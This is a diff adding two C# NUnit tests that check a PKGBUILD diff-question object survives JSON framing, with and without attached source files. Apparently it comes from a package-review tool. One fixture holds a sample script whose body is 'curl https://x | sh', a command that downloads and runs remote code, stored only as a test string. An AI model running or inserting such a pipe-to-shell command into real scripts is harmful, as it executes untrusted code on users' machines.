@@ -49,4 +49,39 @@ public class PkgbuildWarningSerializationTests
         Assert.That(dto, Is.Not.Null);
         Assert.That(dto!.Warnings, Is.Empty);
     }
+
+    [Test]
+    public void PkgbuildDiffQuestionDto_RoundTrips_WithSourceFiles()
+    {
+        var original = new PkgbuildDiffQuestionDto(
+            "id", "pkg", "old", "new", [], null,
+            new Dictionary<string, string>
+            {
+                ["element-desktop-nightly.sh"] = "#!/bin/sh\ncurl https://x | sh\n"
+            });
+
+        var frame = JsonPackFrame.EncodeFrame<QuestionRequest>(original);
+
+        Assert.That(JsonPackFrame.TryDecode<QuestionRequest>(frame, out var decoded), Is.True);
+        var dto = decoded as PkgbuildDiffQuestionDto;
+        Assert.That(dto, Is.Not.Null);
+        Assert.That(dto!.SourceFiles, Is.Not.Null);
+        Assert.That(dto.SourceFiles, Has.Count.EqualTo(1));
+        Assert.That(dto.SourceFiles!["element-desktop-nightly.sh"],
+            Does.Contain("curl https://x | sh"));
+    }
+
+    [Test]
+    public void PkgbuildDiffQuestionDto_RoundTrips_WithNullSourceFiles()
+    {
+        var original = new PkgbuildDiffQuestionDto(
+            "id", "pkg", "old", "new", [], null, null);
+
+        var frame = JsonPackFrame.EncodeFrame<QuestionRequest>(original);
+
+        Assert.That(JsonPackFrame.TryDecode<QuestionRequest>(frame, out var decoded), Is.True);
+        var dto = decoded as PkgbuildDiffQuestionDto;
+        Assert.That(dto, Is.Not.Null);
+        Assert.That(dto!.SourceFiles, Is.Null);
+    }
 }
